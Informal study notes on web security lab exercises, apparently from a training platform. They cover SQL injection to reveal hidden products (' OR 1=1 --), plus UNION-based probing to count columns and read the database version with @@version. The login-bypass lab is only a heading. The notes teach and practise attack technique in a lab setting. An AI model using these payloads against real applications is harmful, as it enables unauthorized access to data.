## Lab 1 : SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

Task: Get the items that are not published yet 
SELECT * FROM products WHERE category = 'Gifts' AND released = 1

I inject ' OR 1=1 --

## What Query becomes ========= SELECT * FROM products WHERE category = '' OR 1=1 -- 
<!-- AND released = 1 -->

' end of string 
1=1 always true ========== Condition 
-- ======== comment out the rest of the command



## Lab 2 : SQL injection vulnerability allowing login bypass






## Lab3  SQL injection attack, querying the database type and version on MySQL and Microsoft
SQL Injection ===== Product Category 
End Goal ==========Display the database version

(1) Find number of columns 

' order by 1 --  => it does't like the -- comments this way lets try the another way 

' order by 1# ====> 200ok response
' order by 2#======> 200 OK Response
' order by 3#=======> 500 Error (Column not found)


Task 2 :
Figure out which column contain text :
' UNION SELECT 'a', 'a'#  ======> 200 OK

Task 3:
Output the version of database:
Lets Test Microsoft 1st the method for that is 

SELECT @@version so command will be
' UNION SELECT @@version , NULL#

8.0.42-0ubuntu0.20.04.1